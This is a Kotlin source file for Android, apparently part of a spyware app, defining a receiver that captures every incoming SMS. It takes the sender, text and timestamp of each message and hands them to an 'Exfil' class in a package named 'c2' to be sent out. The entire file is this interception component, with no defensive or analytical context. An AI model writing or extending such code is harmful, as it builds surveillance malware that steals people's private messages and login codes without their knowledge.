package com.sp.core.services

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import com.sp.core.c2.Exfil

class SmsInterceptor : BroadcastReceiver() {
    override fun onReceive(ctx: Context, intent: Intent) {
        if (intent.action != Telephony.Sms.Intents.SMS_RECEIVED_ACTION) return
        val msgs = Telephony.Sms.Intents.getMessagesFromIntent(intent) ?: return
        for (m in msgs) {
            val payload = """{"from":"${m.originatingAddress}","body":"${esc(m.messageBody ?: "")}","ts":${m.timestampMillis}}"""
            Exfil.sendLog(ctx, "sms", payload)
        }
    }
    private fun esc(s: String) = s.replace("\\", "\\\\").replace("\"", "\\\"")
}